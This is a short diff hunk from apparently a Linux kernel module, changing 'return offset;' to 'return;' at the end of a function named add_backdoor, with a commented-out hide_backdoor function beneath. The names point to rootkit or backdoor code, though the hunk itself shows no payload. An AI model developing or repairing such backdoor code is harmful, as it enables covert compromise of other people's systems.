@@ -184,7 +184,7 @@ void add_backdoor(char *path) {
 			filp_close(file, NULL);
 	
 		exit:
-		    return offset;
+		    return;
 }
 
 // void hide_backdoor (void) {
